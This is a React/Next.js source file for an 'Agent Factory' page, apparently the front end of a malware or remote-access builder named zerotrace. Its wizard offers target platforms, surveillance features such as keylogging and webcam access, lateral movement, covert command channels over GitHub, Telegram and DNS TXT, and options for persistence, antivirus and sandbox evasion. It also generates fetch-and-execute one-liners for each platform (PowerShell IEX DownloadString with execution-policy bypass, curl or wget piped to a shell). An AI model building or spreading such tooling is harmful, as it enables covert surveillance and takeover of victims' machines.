'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import PageLayout from '../components/PageLayout';
import LoadingScreen from '../components/LoadingScreen';
import { User, parseUserFromCookie, removeCookie } from '../utils/auth';

interface AgentCapabilities {
  systemAccess: {
    fileSystemAccess: boolean;
    registryManipulation: boolean;
    processManagement: boolean;
  };
  surveillance: {
    screenshotCapture: boolean;
    keylogging: boolean;
    webcamAccess: boolean;
  };
  network: {
    networkScanning: boolean;
    proxyPivot: boolean;
    lateralMovement: boolean;
  };
}

interface TransportChannels {
  primary: {
    github: boolean;
    telegram: boolean;
    googleDrive: boolean;
  };
  fallback: {
    dnsTxt: boolean;
    pastebin: boolean;
  };
}

interface BuildConfig {
  deliveryFormat: string;
  obfuscationLevel: string;
  persistenceMechanism: boolean;
  avEvasion: boolean;
  sandboxEvasion: boolean;
}

export default function AgentFactoryPage() {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);
  const [selectedPlatform, setSelectedPlatform] = useState<string>('');
  const [currentStep, setCurrentStep] = useState(1);
  const [capabilities, setCapabilities] = useState<AgentCapabilities>({
    systemAccess: {
      fileSystemAccess: true,
      registryManipulation: true,
      processManagement: false,
    },
    surveillance: {
      screenshotCapture: true,
      keylogging: false,
      webcamAccess: false,
    },
    network: {
      networkScanning: true,
      proxyPivot: false,
      lateralMovement: false,
    },
  });
  const [transportChannels, setTransportChannels] = useState<TransportChannels>({
    primary: {
      github: true,
      telegram: true,
      googleDrive: false,
    },
    fallback: {
      dnsTxt: true,
      pastebin: false,
    },
  });
  const [buildConfig, setBuildConfig] = useState<BuildConfig>({
    deliveryFormat: 'Executable (.exe)',
    obfuscationLevel: 'Medium (Balanced)',
    persistenceMechanism: true,
    avEvasion: true,
    sandboxEvasion: false,
  });
  const router = useRouter();

  useEffect(() => {
    // Check if user is logged in via cookies
    const userInfo = parseUserFromCookie();
    if (!userInfo) {
      router.push('/');
      return;
    }

    setUser(userInfo);
    setLoading(false);
  }, [router]);

  const handleLogout = () => {
    removeCookie('user');
    router.push('/');
  };

  const handleCapabilityChange = (category: keyof AgentCapabilities, capability: string, value: boolean) => {
    setCapabilities(prev => ({
      ...prev,
      [category]: {
        ...prev[category],
        [capability]: value,
      },
    }));
  };

  const handleTransportChange = (category: keyof TransportChannels, channel: string, value: boolean) => {
    setTransportChannels(prev => ({
      ...prev,
      [category]: {
        ...prev[category],
        [channel]: value,
      },
    }));
  };

  const handleBuildConfigChange = (setting: keyof BuildConfig, value: string | boolean) => {
    setBuildConfig(prev => ({
      ...prev,
      [setting]: value,
    }));
  };

  const handleNext = () => {
    if (currentStep < 4) {
      setCurrentStep(currentStep + 1);
    }
  };

  const handlePrevious = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
    }
  };

  const handleBuildAgent = () => {
    // Handle agent building logic
    console.log('Building agent for platform:', selectedPlatform);
    console.log('Capabilities:', capabilities);
    console.log('Transport:', transportChannels);
    console.log('Build config:', buildConfig);
  };

  const generateCommand = () => {
    if (selectedPlatform === 'windows') {
      return `powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/zerotrace/agents/main/windows-agent.ps1')"`;
    } else if (selectedPlatform === 'linux') {
      return `curl -s https://raw.githubusercontent.com/zerotrace/agents/main/linux-agent.sh | bash`;
    } else if (selectedPlatform === 'macos') {
      return `curl -s https://raw.githubusercontent.com/zerotrace/agents/main/macos-agent.sh | bash`;
    } else if (selectedPlatform === 'android') {
      return `wget -qO- https://raw.githubusercontent.com/zerotrace/agents/main/android-agent.sh | sh`;
    }
    return '';
  };

  const renderStepContent = () => {
    switch (currentStep) {
      case 1:
        return (
          <>
            {/* Section Heading */}
            <h2 className="text-2xl font-mono font-semibold text-white mb-6">Select Target Platform</h2>

            {/* Platform Selection Cards */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
              {/* Windows Card */}
              <div 
                className={`bg-gray-900 rounded-lg p-6 border-2 cursor-pointer transition-all duration-200 hover:border-green-500 ${
                  selectedPlatform === 'windows' ? 'border-green-500 bg-green-900/20' : 'border-gray-700 hover:bg-gray-800'
                }`}
                onClick={() => setSelectedPlatform('windows')}
              >
                <div className="text-center">
                  <div className="text-4xl mb-4">🖥️</div>
                  <h3 className="text-xl font-mono font-bold text-white mb-2">Windows</h3>
                  <p className="text-gray-400 font-mono text-sm">10, 11, Server</p>
                  {selectedPlatform === 'windows' && (
                    <div className="mt-4 text-green-400 text-sm font-mono">✓ Selected</div>
                  )}
                </div>
              </div>

              {/* Linux Card */}
              <div 
                className={`bg-gray-900 rounded-lg p-6 border-2 cursor-pointer transition-all duration-200 hover:border-green-500 ${
                  selectedPlatform === 'linux' ? 'border-green-500 bg-green-900/20' : 'border-gray-700 hover:bg-gray-800'
                }`}
                onClick={() => setSelectedPlatform('linux')}
              >
                <div className="text-center">
                  <div className="text-4xl mb-4">🐧</div>
                  <h3 className="text-xl font-mono font-bold text-white mb-2">Linux</h3>
                  <p className="text-gray-400 font-mono text-sm">Ubuntu, CentOS, Debian</p>
                  {selectedPlatform === 'linux' && (
                    <div className="mt-4 text-green-400 text-sm font-mono">✓ Selected</div>
                  )}
                </div>
              </div>

              {/* macOS Card */}
              <div 
                className={`bg-gray-900 rounded-lg p-6 border-2 cursor-pointer transition-all duration-200 hover:border-green-500 ${
                  selectedPlatform === 'macos' ? 'border-green-500 bg-green-900/20' : 'border-gray-700 hover:bg-gray-800'
                }`}
                onClick={() => setSelectedPlatform('macos')}
              >
                <div className="text-center">
                  <div className="text-4xl mb-4">🍎</div>
                  <h3 className="text-xl font-mono font-bold text-white mb-2">macOS</h3>
                  <p className="text-gray-400 font-mono text-sm">Monterey, Ventura, Sonoma</p>
                  {selectedPlatform === 'macos' && (
                    <div className="mt-4 text-green-400 text-sm font-mono">✓ Selected</div>
                  )}
                </div>
              </div>

              {/* Android Card */}
              <div 
                className={`bg-gray-900 rounded-lg p-6 border-2 cursor-pointer transition-all duration-200 hover:border-green-500 ${
                  selectedPlatform === 'android' ? 'border-green-500 bg-green-900/20' : 'border-gray-700 hover:bg-gray-800'
                }`}
                onClick={() => setSelectedPlatform('android')}
              >
                <div className="text-center">
                  <div className="text-4xl mb-4">📱</div>
                  <h3 className="text-xl font-mono font-bold text-white mb-2">Android</h3>
                  <p className="text-gray-400 font-mono text-sm">API 21+</p>
                  {selectedPlatform === 'android' && (
                    <div className="mt-4 text-green-400 text-sm font-mono">✓ Selected</div>
                  )}
                </div>
              </div>
            </div>
          </>
        );

      case 2:
        return (
          <>
            {/* Section Heading */}
            <h2 className="text-2xl font-mono font-semibold text-white mb-6">Agent Capabilities</h2>

            {/* Capabilities Grid */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-8">
              {/* System Access */}
              <div className="bg-gray-900 rounded-lg p-6 border border-gray-700">
                <h3 className="text-lg font-mono font-semibold text-blue-400 mb-4">System Access</h3>
                <div className="space-y-3">
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.systemAccess.fileSystemAccess}
                      onChange={(e) => handleCapabilityChange('systemAccess', 'fileSystemAccess', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">File System Access</span>
                  </label>
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.systemAccess.registryManipulation}
                      onChange={(e) => handleCapabilityChange('systemAccess', 'registryManipulation', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">Registry Manipulation</span>
                  </label>
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.systemAccess.processManagement}
                      onChange={(e) => handleCapabilityChange('systemAccess', 'processManagement', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">Process Management</span>
                  </label>
                </div>
              </div>

              {/* Surveillance */}
              <div className="bg-gray-900 rounded-lg p-6 border border-gray-700">
                <h3 className="text-lg font-mono font-semibold text-blue-400 mb-4">Surveillance</h3>
                <div className="space-y-3">
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.surveillance.screenshotCapture}
                      onChange={(e) => handleCapabilityChange('surveillance', 'screenshotCapture', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">Screenshot Capture</span>
                  </label>
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.surveillance.keylogging}
                      onChange={(e) => handleCapabilityChange('surveillance', 'keylogging', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">Keylogging</span>
                  </label>
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.surveillance.webcamAccess}
                      onChange={(e) => handleCapabilityChange('surveillance', 'webcamAccess', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">Webcam Access</span>
                  </label>
                </div>
              </div>

              {/* Network */}
              <div className="bg-gray-900 rounded-lg p-6 border border-gray-700">
                <h3 className="text-lg font-mono font-semibold text-blue-400 mb-4">Network</h3>
                <div className="space-y-3">
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.network.networkScanning}
                      onChange={(e) => handleCapabilityChange('network', 'networkScanning', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">Network Scanning</span>
                  </label>
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.network.proxyPivot}
                      onChange={(e) => handleCapabilityChange('network', 'proxyPivot', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">Proxy/Pivot</span>
                  </label>
                  <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={capabilities.network.lateralMovement}
                      onChange={(e) => handleCapabilityChange('network', 'lateralMovement', e.target.checked)}
                      className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                    />
                    <span className="font-mono text-sm">Lateral Movement</span>
                  </label>
                </div>
              </div>
            </div>
          </>
        );

      case 3:
        return (
          <>
            {/* Section Heading */}
            <h2 className="text-2xl font-mono font-semibold text-white mb-6">Transport Configuration</h2>

            {/* Transport Channels Grid */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-8">
              {/* Primary Channels */}
              <div className="bg-gray-900 rounded-lg p-6 border border-gray-700">
                <h3 className="text-lg font-mono font-semibold text-blue-400 mb-4">Primary Channels</h3>
                <div className="space-y-3">
                  <label className="flex items-center justify-between text-gray-300 cursor-pointer">
                    <div className="flex items-center space-x-3">
                      <input
                        type="checkbox"
                        checked={transportChannels.primary.github}
                        onChange={(e) => handleTransportChange('primary', 'github', e.target.checked)}
                        className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                      />
                      <span className="font-mono text-sm">GitHub</span>
                    </div>
                    <span className="text-green-400 font-mono text-sm">98.2%</span>
                  </label>
                  <label className="flex items-center justify-between text-gray-300 cursor-pointer">
                    <div className="flex items-center space-x-3">
                      <input
                        type="checkbox"
                        checked={transportChannels.primary.telegram}
                        onChange={(e) => handleTransportChange('primary', 'telegram', e.target.checked)}
                        className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                      />
                      <span className="font-mono text-sm">Telegram</span>
                    </div>
                    <span className="text-green-400 font-mono text-sm">99.1%</span>
                  </label>
                  <label className="flex items-center justify-between text-gray-300 cursor-pointer">
                    <div className="flex items-center space-x-3">
                      <input
                        type="checkbox"
                        checked={transportChannels.primary.googleDrive}
                        onChange={(e) => handleTransportChange('primary', 'googleDrive', e.target.checked)}
                        className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                      />
                      <span className="font-mono text-sm">Google Drive</span>
                    </div>
                    <span className="text-green-400 font-mono text-sm">96.7%</span>
                  </label>
                </div>
              </div>

              {/* Fallback Channels */}
              <div className="bg-gray-900 rounded-lg p-6 border border-gray-700">
                <h3 className="text-lg font-mono font-semibold text-blue-400 mb-4">Fallback Channels</h3>
                <div className="space-y-3">
                  <label className="flex items-center justify-between text-gray-300 cursor-pointer">
                    <div className="flex items-center space-x-3">
                      <input
                        type="checkbox"
                        checked={transportChannels.fallback.dnsTxt}
                        onChange={(e) => handleTransportChange('fallback', 'dnsTxt', e.target.checked)}
                        className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                      />
                      <span className="font-mono text-sm">DNS TXT</span>
                    </div>
                    <span className="text-green-400 font-mono text-sm">99.8%</span>
                  </label>
                  <label className="flex items-center justify-between text-gray-300 cursor-pointer">
                    <div className="flex items-center space-x-3">
                      <input
                        type="checkbox"
                        checked={transportChannels.fallback.pastebin}
                        onChange={(e) => handleTransportChange('fallback', 'pastebin', e.target.checked)}
                        className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                      />
                      <span className="font-mono text-sm">Pastebin</span>
                    </div>
                    <span className="text-green-400 font-mono text-sm">85.4%</span>
                  </label>
                </div>
              </div>
            </div>
          </>
        );

      case 4:
        return (
          <>
            {/* Section Heading */}
            <h2 className="text-2xl font-mono font-semibold text-white mb-6">Build Configuration</h2>

            {/* Build Configuration Grid */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-8">
              {/* Build Options */}
              <div className="bg-gray-900 rounded-lg p-6 border border-gray-700">
                <h3 className="text-lg font-mono font-semibold text-blue-400 mb-4">Build Options</h3>
                <div className="space-y-4">
                  <div>
                    <label className="block text-gray-300 font-mono text-sm mb-2">Delivery Format</label>
                    <select
                      value={buildConfig.deliveryFormat}
                      onChange={(e) => handleBuildConfigChange('deliveryFormat', e.target.value)}
                      className="w-full bg-gray-800 border border-gray-600 rounded px-3 py-2 text-white text-sm font-mono focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-green-500"
                    >
                      <option>Executable (.exe)</option>
                      <option>PowerShell Script (.ps1)</option>
                      <option>Python Script (.py)</option>
                      <option>Shell Script (.sh)</option>
                    </select>
                  </div>
                  <div>
                    <label className="block text-gray-300 font-mono text-sm mb-2">Obfuscation Level</label>
                    <select
                      value={buildConfig.obfuscationLevel}
                      onChange={(e) => handleBuildConfigChange('obfuscationLevel', e.target.value)}
                      className="w-full bg-gray-800 border border-gray-600 rounded px-3 py-2 text-white text-sm font-mono focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-green-500"
                    >
                      <option>None</option>
                      <option>Low (Basic)</option>
                      <option>Medium (Balanced)</option>
                      <option>High (Maximum)</option>
                    </select>
                  </div>
                  <div>
                    <h4 className="text-gray-300 font-mono text-sm mb-3">Advanced Options</h4>
                    <div className="space-y-2">
                      <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                        <input
                          type="checkbox"
                          checked={buildConfig.persistenceMechanism}
                          onChange={(e) => handleBuildConfigChange('persistenceMechanism', e.target.checked)}
                          className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                        />
                        <span className="font-mono text-sm">Persistence Mechanism</span>
                      </label>
                      <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                        <input
                          type="checkbox"
                          checked={buildConfig.avEvasion}
                          onChange={(e) => handleBuildConfigChange('avEvasion', e.target.checked)}
                          className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                        />
                        <span className="font-mono text-sm">AV Evasion</span>
                      </label>
                      <label className="flex items-center space-x-3 text-gray-300 cursor-pointer">
                        <input
                          type="checkbox"
                          checked={buildConfig.sandboxEvasion}
                          onChange={(e) => handleBuildConfigChange('sandboxEvasion', e.target.checked)}
                          className="w-4 h-4 text-green-600 bg-gray-700 border-gray-600 rounded focus:ring-green-500 focus:ring-2"
                        />
                        <span className="font-mono text-sm">Sandbox Evasion</span>
                      </label>
                    </div>
                  </div>
                </div>
              </div>

              {/* Generated Command */}
              <div className="bg-gray-900 rounded-lg p-6 border border-gray-700">
                <h3 className="text-lg font-mono font-semibold text-blue-400 mb-4">Generated Command</h3>
                <div className="space-y-4">
                  <div className="bg-gray-800 rounded p-3 border border-gray-600">
                    <textarea
                      value={generateCommand()}
                      readOnly
                      className="w-full h-24 bg-transparent text-green-400 font-mono text-sm resize-none focus:outline-none"
                    />
                  </div>
                  <div className="flex space-x-3">
                    <button className="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded font-mono text-sm transition-colors">
                      COPY
                    </button>
                    <button className="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded font-mono text-sm transition-colors flex items-center space-x-2">
                      <span>QR Code</span>
                      <span className="text-lg">📱</span>
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </>
        );

      default:
        return null;
    }
  };

  if (loading) {
    return <LoadingScreen message="Loading Agent Factory..." />;
  }

  if (!user) {
    return null;
  }

  return (
    <PageLayout user={user} currentPage="agentfactory" onLogout={handleLogout}>
      {/* Main Content Area */}
      <main className="flex-1 p-6 bg-gray-950 overflow-auto">
        {/* Page Title */}
        <div className="mb-8">
          <h1 className="text-4xl font-mono font-bold text-green-400 mb-4">Agent Factory</h1>
          
          {/* Progress Steps */}
          <div className="flex items-center space-x-8 mb-8">
            <div className="flex items-center space-x-2">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center font-mono font-bold text-sm ${
                currentStep >= 1 ? 'bg-green-500 text-black' : 'bg-gray-700 text-gray-400'
              }`}>
                1
              </div>
              <span className={`font-mono text-sm ${currentStep >= 1 ? 'text-green-400' : 'text-gray-500'}`}>
                Platform
              </span>
            </div>
            
            <div className="flex items-center space-x-2">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center font-mono font-bold text-sm ${
                currentStep >= 2 ? 'bg-green-500 text-black' : 'bg-gray-700 text-gray-400'
              }`}>
                2
              </div>
              <span className={`font-mono text-sm ${currentStep >= 2 ? 'text-green-400' : 'text-gray-500'}`}>
                Capabilities
              </span>
            </div>
            
            <div className="flex items-center space-x-2">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center font-mono font-bold text-sm ${
                currentStep >= 3 ? 'bg-green-500 text-black' : 'bg-gray-700 text-gray-400'
              }`}>
                3
              </div>
              <span className={`font-mono text-sm ${currentStep >= 3 ? 'text-green-400' : 'text-gray-500'}`}>
                Transport
              </span>
            </div>
            
            <div className="flex items-center space-x-2">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center font-mono font-bold text-sm ${
                currentStep >= 4 ? 'bg-green-500 text-black' : 'bg-gray-700 text-gray-400'
              }`}>
                4
              </div>
              <span className={`font-mono text-sm ${currentStep >= 4 ? 'text-green-400' : 'text-gray-500'}`}>
                Build
              </span>
            </div>
          </div>

          {/* Step Content */}
          {renderStepContent()}
        </div>

        {/* Navigation Buttons */}
        <div className="flex items-center justify-between">
          <button
            onClick={handlePrevious}
            disabled={currentStep === 1}
            className={`px-6 py-3 rounded-lg font-mono font-semibold transition-all duration-200 ${
              currentStep === 1 
                ? 'bg-gray-700 text-gray-500 cursor-not-allowed' 
                : 'bg-gray-600 hover:bg-gray-500 text-white'
            }`}
          >
            PREVIOUS
          </button>

          <button
            onClick={handleNext}
            disabled={currentStep === 4}
            className={`px-6 py-3 rounded-lg font-mono font-semibold transition-all duration-200 ${
              currentStep === 4
                ? 'bg-gray-700 text-gray-500 cursor-not-allowed'
                : 'bg-green-600 hover:bg-green-700 text-white'
            }`}
          >
            NEXT
          </button>

          <button
            onClick={handleBuildAgent}
            disabled={currentStep !== 4}
            className={`px-6 py-3 rounded-lg font-mono font-semibold transition-all duration-200 ${
              currentStep !== 4
                ? 'bg-gray-700 text-gray-500 cursor-not-allowed'
                : 'bg-green-600 hover:bg-green-700 text-white'
            }`}
          >
            BUILD AGENT
          </button>
        </div>
      </main>
    </PageLayout>
  );
}
